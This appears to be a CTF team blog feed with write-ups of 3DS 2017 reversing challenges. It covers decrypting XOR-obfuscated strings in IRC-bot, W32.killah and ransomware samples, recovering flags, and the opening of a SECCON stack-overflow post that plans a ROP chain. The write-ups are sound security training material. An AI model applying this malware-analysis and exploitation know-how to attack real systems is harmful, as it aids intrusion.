class="title">xor_encrytion</span><span class="params">(al, ecx, edx)</span>:</span></div><div class="line">	c = <span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</div><div class="line">		n = chr((((ord(edx[i]) + ord(al))%<span class="number">256</span>) ^ ord(al)) %<span class="number">256</span>)</div><div class="line">		s = chr(ord(edx[i]) ^ ord(al))</div><div class="line">		<span class="comment">#print n,s</span></div><div class="line">		<span class="keyword">if</span> s <span class="keyword">in</span> string.printable:</div><div class="line">			c += s</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			c += n</div><div class="line">		<span class="comment">#print c</span></div><div class="line">	<span class="keyword">return</span> c</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_4005D0</span><span class="params">(al, ecx, edx)</span>:</span></div><div class="line">	c = <span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</div><div class="line">		c += chr(ord(edx[i]) ^ ord(al))</div><div class="line">	<span class="keyword">return</span> c</div><div class="line"></div><div class="line">a = sub_4005D0(al=<span class="string">'\x12'</span>,ecx=<span class="number">7</span><span class="number">-1</span>, edx=<span class="string">'1`scg&#123;'</span>)</div><div class="line">b = sub_4005D0(al=<span class="string">'\x12'</span>,ecx=<span class="number">0x11</span><span class="number">-1</span>, edx=<span class="string">'&#123;`q&lt;t`ww|&#125;vw&lt;|wf'</span>)</div><div class="line">c = sub_4005D0(al=<span class="string">'\x12'</span>,ecx=<span class="number">0xa</span><span class="number">-1</span>, edx=<span class="string">'s``&#125;\x7f\x70\x73\x76\x7d'</span>)</div><div class="line">d = sub_4005D0(al=<span class="string">'\x12'</span>,ecx=<span class="number">0x8</span><span class="number">-1</span>, edx=<span class="string">'qsfgsps'</span>)</div><div class="line"></div><div class="line">f = xor_encrytion(al=<span class="string">'\x85'</span>, ecx=<span class="number">0x10</span><span class="number">-1</span>, edx=<span class="string">'%&lt;EmqhiYUi0deY\\'</span>)</div><div class="line">g = xor_encrytion(al=<span class="string">'\x82'</span>, ecx=<span class="number">0x10</span><span class="number">-1</span>, edx=f)</div><div class="line"></div><div class="line">h = xor_encrytion(al=<span class="string">'\xe4'</span>, ecx=<span class="number">0x12</span><span class="number">-1</span>, edx=<span class="string">'mckW,sSWisWdak3!u'</span>)</div><div class="line">i = xor_encrytion(al=<span class="string">'\xc0'</span>, ecx=<span class="number">0x12</span><span class="number">-1</span>, edx=h)</div><div class="line"></div><div class="line"><span class="keyword">print</span> a,b,c,d</div><div class="line"><span class="keyword">print</span> g+i</div></pre></td></tr></table></figure>
<p>Running it </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ python ircbot.py</div><div class="line"><span class="comment">#raqui irc.freenode.net arrombado catuaba</span></div><div class="line"><span class="number">3</span>DS&#123;who_co0ls_duck_4sS_is_lak3!&#125;</div></pre></td></tr></table></figure>
<p>The flag was <strong>3DS{who_co0ls_duck_4sS_is_lak3!}</strong>, note that the first line is other obfuscated strings you could decrypt to help you understand the control flow of the binary.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;IRC Bot Takeover - 486 Points&lt;br&gt;&lt;br&gt;WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!&lt;br&gt;&lt;br&gt;&lt;br&gt;Update: W
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
      <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
    
      <category term="malware" scheme="https://teamrocketist.github.io/tags/malware/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 3DS - W32.killah</title>
    <link href="https://teamrocketist.github.io/2017/12/19/Reverse-3DS-W32-killah/"/>
    <id>https://teamrocketist.github.io/2017/12/19/Reverse-3DS-W32-killah/</id>
    <published>2017-12-19T21:15:19.000Z</published>
    <updated>2017-12-19T21:36:42.649Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>W32.killah - 487 Points<br><br>Caution.. “The flag is over there..”<br><br>Password: “infected!”<br><br>WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!<br></blockquote>

<p>Another malware problem, all malware problems were practically the same the writer of this challenge should have at least make it different from the others, as in <a href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/">Ransomware</a> we have to decrypt more obfuscated strings but this time the encryption function is more difficult to understand, it does a summation before a xor, and uses 8 bit based operations (8 bit registers), we can see the beginning of <strong>start</strong> function we are actually decrypting a string:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/JeRJKZs.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/JeRJKZs.png" alt=""><br></a></p>
<p>As I explained previously in <a href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/">Ransomware</a> <strong>ecx</strong> is storing the string length, <strong>al</strong> is the single byte used to encrypt the string and <strong>edx</strong> is where is stored the encrypted string.</p>
<p>Analysing the encryption function <strong>sub_4011A9</strong>, we can see it doesn’t only uses <strong>xor</strong> but it uses an addition operation before that:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/Tpno1sA.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/Tpno1sA.png" alt=""><br></a></p>
<p>We know that a character must be between 0 to 255, the additions will break this range, I’m not so sure about this but I think in assembly when there is an 8 bit operation if an overflow occurs, it returns back to 0 and that’s what I tried to write in python : </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_encrytion</span><span class="params">(al, ecx, edx)</span>:</span></div><div class="line">	c = <span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</div><div class="line">		n = chr((((ord(edx[i]) + ord(al))%<span class="number">256</span>) ^ ord(al)) %<span class="number">256</span>)</div><div class="line">		s = chr(ord(edx[i]) ^ ord(al))</div><div class="line">		<span class="comment">#print n,s</span></div><div class="line">		<span class="keyword">if</span> s <span class="keyword">in</span> string.printable:</div><div class="line">			c += s</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			c += n</div><div class="line">		<span class="comment">#print c</span></div><div class="line">	<span class="keyword">return</span> c</div><div class="line">buf = struct.pack (<span class="string">"17B"</span>, *[</div><div class="line"><span class="number">0xC6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xca</span>,<span class="number">0xf2</span>,<span class="number">0xe3</span>,<span class="number">0xe9</span>,<span class="number">0xf3</span>,<span class="number">0xf9</span>,<span class="number">0xfb</span>,<span class="number">0xf6</span>,</div><div class="line"><span class="number">0xde</span>,<span class="number">0xe8</span>,<span class="number">0xf3</span>,<span class="number">0xec</span>,<span class="number">0xff</span>,<span class="number">0xaa</span>])</div></pre></td></tr></table></figure>
<p>Well this actually worked for the first encrypted string:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python w32killah.py</div><div class="line">3DS&#123;m4lw@r3_1</div></pre></td></tr></table></figure>
<p>And we got the first part of the flag… while searching in IDA I didn’t initially found the other encryption code until I started searching and found some code that wasn’t present in the function window:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/GX1e2Fy.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/GX1e2Fy.png" alt=""><br></a></p>
<p>Once again we need to decrypt that string but this time the function I wrote in python didn’t really work, outputed me a bunch of non printable characters, so I may misunderstood how actually 8 bit operations work in assembly, but I still managed to solve this by trying a bunch of other key bytes:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_encrytion</span><span class="params">(al, ecx, edx)</span>:</span></div><div class="line">	c = <span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</div><div class="line">		n = chr((((ord(edx[i]) + ord(al))%<span class="number">256</span>) ^ ord(al)) %<span class="number">256</span>)</div><div class="line">		s = chr(ord(edx[i]) ^ ord(al))</div><div class="line">		<span class="comment">#print n,s</span></div><div class="line">		<span class="keyword">if</span> s <span class="keyword">in</span> string.printable:</div><div class="line">			c += s</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			c += n</div><div class="line">		<span class="comment">#print c</span></div><div class="line">	<span class="keyword">return</span> c</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0xff</span>):</div><div class="line">	<span class="keyword">print</span> xor_encrytion(al=chr(i),ecx=<span class="number">0x10</span><span class="number">-1</span>,edx=struct.pack (<span class="string">"15B"</span>, *[</div><div class="line">	<span class="number">0xb3</span>,<span class="number">0xdf</span>,<span class="number">0xa6</span>,<span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xcb</span>,<span class="number">0xa9</span>,<span class="number">0xae</span>,<span class="number">0xc7</span>,<span class="number">0xdf</span>,<span class="number">0xa6</span>,</div><div class="line">	<span class="number">0xb5</span>,<span class="number">0xae</span>,<span class="number">0xe1</span>,<span class="number">0xbd</span>])), i</div></pre></td></tr></table></figure>
<p>A there we go the key to decrypt the flag with the function I wrote was <strong>96</strong> in hex is <strong>0x60</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$ python w32.killah.py | grep <span class="string">'&#125;'</span></div><div class="line">s_fucKinG_fun!&#125; 96</div><div class="line">w<span class="comment">#jugOirK#jur!&#125; 98</span></div><div class="line">s<span class="string">'n&#125;cKivO'</span>n&#125;v!E 100</div><div class="line">&#125;!nmUkvI!nv<span class="comment">#G 101</span></div><div class="line"><span class="comment">#j&#125;oWirK#j&#125;r!E 102</span></div><div class="line">&#125;!j&#123;mUwrI!j&#123;r/C 103</div><div class="line">M!~O&#125;U&#123;vY!~Ov<span class="comment">#G 109</span></div><div class="line">M!zK&#125;UwrY!zKr?C 111</div><div class="line">/C:)?W52[C:)2&#125;! 156</div><div class="line">s_fuc</div><div class="line">     inG_fun!&#125; 192</div><div class="line">&#123;on&#125;k[afGon&#125;f)u 200</div><div class="line">&#125;ch&#123;mWg`	ch&#123;`/s 206</div><div class="line">`</div><div class="line"> ufpMz&#125;I</div><div class="line">        uf&#125;2n 211</div><div class="line">g</div><div class="line"> rawK&#125;zO</div><div class="line">        raz5i 212</div><div class="line">ha&#125;nx&#125;ruya&#125;nu:f 219</div><div class="line">mcxk&#125;wwp&#123;cxkp?c 222</div></pre></td></tr></table></figure></p>
<p>The flag was <strong>3DS{m4lw@r3_1s_fucKinG_fun!}</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;W32.killah - 487 Points&lt;br&gt;&lt;br&gt;Caution.. “The flag is over there..”&lt;br&gt;&lt;br&gt;Password: “infected!”&lt;br&gt;&lt;br&gt;WARNING! DON’T EXECU
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
      <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
    
      <category term="malware" scheme="https://teamrocketist.github.io/tags/malware/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 3DS - Ransomware</title>
    <link href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/"/>
    <id>https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/</id>
    <published>2017-12-18T19:45:33.000Z</published>
    <updated>2017-12-18T20:24:15.893Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Ransomware - 464 Points<br>WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!<br></blockquote>

<p>We have a malware to analyse, right at the beginning(_start function) I found an encrypted string with xor, reversing it wasn’t very hard as you can see bellow:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/TN8MrPg.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/TN8MrPg.png" alt=""><br></a></p>
<p>The actual function in the ida was this one:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/RTpcq1L.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/RTpcq1L.png" alt=""><br></a></p>
<p>Rewriting this function into python we ended up with this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_4005D0</span><span class="params">(al, ecx, edx)</span>:</span></div><div class="line">	c = <span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</div><div class="line">		c += chr(ord(edx[i]) ^ ord(al))</div><div class="line">	<span class="keyword">return</span> c</div><div class="line"></div><div class="line">first = struct.pack (<span class="string">"16B"</span>, *[</div><div class="line"><span class="number">0xea</span>,<span class="number">0xe8</span>,<span class="number">0xe4</span>,<span class="number">0xe8</span>,<span class="number">0xef</span>,<span class="number">0xdb</span>,<span class="number">0xe1</span>,<span class="number">0xeb</span>,<span class="number">0xe6</span>,<span class="number">0xe0</span>,<span class="number">0xa9</span>,</div><div class="line"><span class="number">0xea</span>,<span class="number">0xe8</span>,<span class="number">0xe4</span>,<span class="number">0xe8</span>,<span class="number">0xef</span>])</div><div class="line"><span class="keyword">print</span> sub_4005D0(al=<span class="string">'\x87'</span>,ecx=<span class="number">0x11</span><span class="number">-1</span>, edx=first)</div></pre></td></tr></table></figure>
<p>By running the script we can see that the encrypted string was the name of the file we received from the challenge which was encrypted:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python writeup_mocoh.py </div><div class="line">mocoh\flag.moco</div></pre></td></tr></table></figure>
<p>One good thing to do while reversing is to rename the function and string names to a more readable names, so if they are reused we can immediately recognize them :<br><a data-fancybox="gallery" href="https://i.imgur.com/AAnYTBF.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/AAnYTBF.png" alt=""><br></a></p>
<p>Now continuing analysing the contents of <code>sub_40023B</code> we have more strings to decrypt:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/qjZakVp.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/qjZakVp.png" alt=""><br></a></p>
<p>Updating this python script with this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_4005D0</span><span class="params">(al, ecx, edx)</span>:</span></div><div class="line">	c = <span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</div><div class="line">		c += chr(ord(edx[i]) ^ ord(al))</div><div class="line">	<span class="keyword">return</span> c</div><div class="line"></div><div class="line">first = struct.pack (<span class="string">"16B"</span>, *[</div><div class="line"><span class="number">0xea</span>,<span class="number">0xe8</span>,<span class="number">0xe4</span>,<span class="number">0xe8</span>,<span class="number">0xef</span>,<span class="number">0xdb</span>,<span class="number">0xe1</span>,<span class="number">0xeb</span>,<span class="number">0xe6</span>,<span class="number">0xe0</span>,<span class="number">0xa9</span>,</div><div class="line"><span class="number">0xea</span>,<span class="number">0xe8</span>,<span class="number">0xe4</span>,<span class="number">0xe8</span>,<span class="number">0xef</span>])</div><div class="line"><span class="keyword">print</span> sub_4005D0(al=<span class="string">'\x87'</span>,ecx=<span class="number">0x11</span><span class="number">-1</span>, edx=first)</div><div class="line">a = sub_4005D0(al=<span class="string">'\x54'</span>,ecx=<span class="number">9</span><span class="number">-1</span>, edx=struct.pack (<span class="string">"8B"</span>, *[</div><div class="line"><span class="number">0x27</span>,<span class="number">0x31</span>,<span class="number">0x21</span>,<span class="number">0x26</span>,<span class="number">0x21</span>,<span class="number">0x36</span>,<span class="number">0x21</span>,<span class="number">0x37</span>]))</div><div class="line">b = sub_4005D0(al=<span class="string">'\x80'</span>,ecx=<span class="number">9</span><span class="number">-1</span>, edx=struct.pack (<span class="string">"8B"</span>, *[</div><div class="line"><span class="number">0xe1</span>,<span class="number">0xee</span>,<span class="number">0xf4</span>,<span class="number">0xe1</span>,<span class="number">0xf3</span>,<span class="number">0xf3</span>,<span class="number">0xe5</span>,<span class="number">0xe5</span>]))</div><div class="line">c = sub_4005D0(al=<span class="string">'\x14'</span>,ecx=<span class="number">9</span><span class="number">-1</span>, edx=struct.pack (<span class="string">"8B"</span>, *[</div><div class="line"><span class="number">0x61</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0x78</span>,<span class="number">0x7b</span>,<span class="number">0x77</span>,<span class="number">0x75</span>,<span class="number">0x62</span>]))</div><div class="line">d = sub_4005D0(al=<span class="string">'\x32'</span>,ecx=<span class="number">0xa</span><span class="number">-1</span>, edx=struct.pack (<span class="string">"9B"</span>, *[</div><div class="line"><span class="number">0x53</span>,<span class="number">0x5c</span>,<span class="number">0x53</span>,<span class="number">0x55</span>,<span class="number">0x53</span>,<span class="number">0x5b</span>,<span class="number">0x5d</span>,<span class="number">0x5e</span>,<span class="number">0x53</span>]))</div><div class="line"></div><div class="line"><span class="keyword">print</span> a</div><div class="line"><span class="keyword">print</span> b</div><div class="line"><span class="keyword">print</span> c</div><div class="line"><span class="keyword">print</span> d</div></pre></td></tr></table></figure>
<p>By running we can see it’s some words in Portuguese and they don’t look really useful at all:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python mocoh.py</div><div class="line">mocoh\flag.mocoh</div><div class="line">mocoh\flag.mocoh</div><div class="line">seurubuc</div><div class="line">antassee</div><div class="line">ucolocav</div><div class="line">anagaiola</div></pre></td></tr></table></figure>
<p>After renaming the variable names in IDA ended up in this final part of the program:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/LdcEHnx.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/LdcEHnx.png" alt=""><br></a></p>
<p>As you can see above every string we decrypted is being concatenated into a place in memory at <strong>dword_4012c0</strong>, and at the end in <strong>sub_4005DA</strong> the flag file name is being pushed in to the stack since this will be a argument to that function so this may be the one that was used to encrypted the <em>flag.mocoh</em> file!</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/TCnKYK2.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/TCnKYK2.png" alt=""><br></a></p>
<p>Now by checking this function I found it too hard to reverse <strong>sub_400684</strong>, without running the malware itself (Couldn’t do it since it executable wasn’t compatible with my Windows 10 VM), so after failing to infect myself and debugging it with IDA, I checked that <strong>sub_4006D8</strong> of them was using xor again to encrypt that file:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/DZrDX8X.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/DZrDX8X.png" alt=""><br></a></p>
<p>Now you may be asking if I didn’t reverse <strong>sub_400684</strong> how the hell I did get the keys to decrypt the flag file? well I wasn’t really expecting this to happen but at some point I knew I could know the first 4 bytes of the key because we know the first 4 bytes of the plaintext which is part of the flag format <strong>3DS{</strong>, I wanted to check before reversing the rest, the first 4 bytes of the key, I did this by brute-forcing byte by byte:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">flag_cipher = open(<span class="string">'flag.mocoh'</span>, <span class="string">'r'</span>).read()</div><div class="line">plain = <span class="string">'3DS&#123;'</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x4</span>):</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">0xff</span>):</div><div class="line">        <span class="keyword">if</span> ord(plain[i]) == ord(flag_cipher[i]) ^ x:</div><div class="line">            <span class="keyword">print</span> x</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure>
<p>And surprisingly to me the first 4 bytes of the keys was always <strong>175</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ python test.py </div><div class="line">175</div><div class="line">175</div><div class="line">175</div><div class="line">175</div></pre></td></tr></table></figure>
<p>And then I asked myself what if the key is always the same? this couldn’t be a coincidence:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">flag_cipher = open(<span class="string">'flag.mocoh'</span>, <span class="string">'r'</span>).read()</div><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i,c <span class="keyword">in</span> enumerate(flag_cipher):</div><div class="line">    flag += chr(ord(c) ^ <span class="number">175</span>)</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
<p>Running it we could see that this was the case…<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python test.py </div><div class="line">3DS&#123;4sS3mbly_r0cks!!&#125;</div></pre></td></tr></table></figure></p>
<p>And in the end I realized that I lost a lot of time reversing the binary, we didn’t even needed to reverse anything, if we made a guess that it was xor we could just tried and check that it was using always the same 1 byte key to encrypt…</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Ransomware - 464 Points&lt;br&gt;WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!&lt;br&gt;&lt;/blockquote&gt;

&lt;p&gt;We have a
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
      <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
    
      <category term="malware" scheme="https://teamrocketist.github.io/tags/malware/"/>
    
      <category term="ida" scheme="https://teamrocketist.github.io/tags/ida/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 3DS - Scared Flag</title>
    <link href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Scared-Flag/"/>
    <id>https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Scared-Flag/</id>
    <published>2017-12-18T03:58:03.000Z</published>
    <updated>2017-12-18T04:19:37.572Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Scared Flag - 479 Points<br><br>ヽ(ﾟДﾟ)ﾉ<br></blockquote>

<p>After unzipping the file we can see that we have a <strong>.hex</strong> which according to <a href="https://en.wikipedia.org/wiki/Intel_HEX" target="_blank" rel="external">Wikipedia</a>:</p>
<blockquote>
<p>Intel HEX is a file format that conveys binary information in ASCII text form. It is commonly used for programming microcontrollers, EPROMs, and other types of programmable logic devices. In a typical application, a compiler or assembler converts a program’s source code (such as in C or assembly language) to machine code and outputs it into a HEX file.</p>
</blockquote>
<p>So after finding out what the hell was this I searched in the web a way to convert this into a binary format or assembly, and I found a post in stack overflow recommending to use <a href="http://www.keil.com/download/docs/7.asp" target="_blank" rel="external">this</a>…</p>
<p>After downloading, I made the conversion:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ ./hex2bin -b ../ea137e7356e566945e51bbece00a22ad.hex </div><div class="line">hex2bin v2.5, Copyright (C) 2017 Jacques Pelletier &amp; contributors</div><div class="line"></div><div class="line">Allocate_Memory_and_Rewind:</div><div class="line">Lowest address:   00000000</div><div class="line">Highest address:  00000BC5</div><div class="line">Starting address: 00000000</div><div class="line">Max Length:       3014</div><div class="line"></div><div class="line">Binary file start = 00000000</div><div class="line">Records start     = 00000000</div><div class="line">Highest address   = 00000BC5</div><div class="line">Pad Byte          = FF</div></pre></td></tr></table></figure>
<p>The program outputs a <strong>ea137e7356e566945e51bbece00a22ad.bin</strong>, I used radare2 to reverse it, after checking the code I saw the <strong>initials of the flag</strong> in this routine at <strong>fcn.000005de</strong> (You need to scroll down a little in radare2 the function is quite big).<br><a data-fancybox="gallery" href="https://i.imgur.com/W7YSGzM.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/W7YSGzM.png" alt=""><br></a><br>The flag was 3DS{youareabully}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Scared Flag - 479 Points&lt;br&gt;&lt;br&gt;ヽ(ﾟДﾟ)ﾉ&lt;br&gt;&lt;/blockquote&gt;

&lt;p&gt;After unzipping the file we can see that we have a &lt;strong&gt;.hex
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="intel_hex" scheme="https://teamrocketist.github.io/tags/intel-hex/"/>
    
      <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
    
      <category term="hex2bin" scheme="https://teamrocketist.github.io/tags/hex2bin/"/>
    
      <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] SECCON - Baby Stack</title>
    <link href="https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/"/>
    <id>https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/</id>
    <published>2017-12-13T04:05:45.000Z</published>
    <updated>2017-12-14T17:28:20.818Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Baby Stack<br><br>Can you do a traditional stack attack?<br><br>Host : baby_stack.pwn.seccon.jp<br>Port : 15285<br>baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8<br></blockquote>

<h3 id="Overflow-the-Buffer"><a href="#Overflow-the-Buffer" class="headerlink" title="Overflow the Buffer"></a>Overflow the Buffer</h3><p>We have a <strong>go executable</strong> which is <strong>harder</strong> to reverse than c, by reading the challenge title we can see that this challenge is probably about a <strong>buffer overflow in the stack</strong>, another thing we also notice that the binary is <strong>statically linked</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </div><div class="line">baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped</div></pre></td></tr></table></figure>
<p>Since is statically linked we know that this binary <strong>isn’t</strong> going to use the <strong>libc file in our system</strong>, every libc function used is <strong>embedded</strong> in the binary itself, this a problem we can’t just jump into libc because some useful functions like <strong>system</strong> aren’t present, but we can still build a ROP chain that does a system call to execve, this is very similar to writting shellcode but instead of writting a script we are going to use gadgets to build it.</p>
<p>By checking the security of the binary we can see the only protection enabled is <strong>NX (Non-Executable Stack)</strong>.</p>
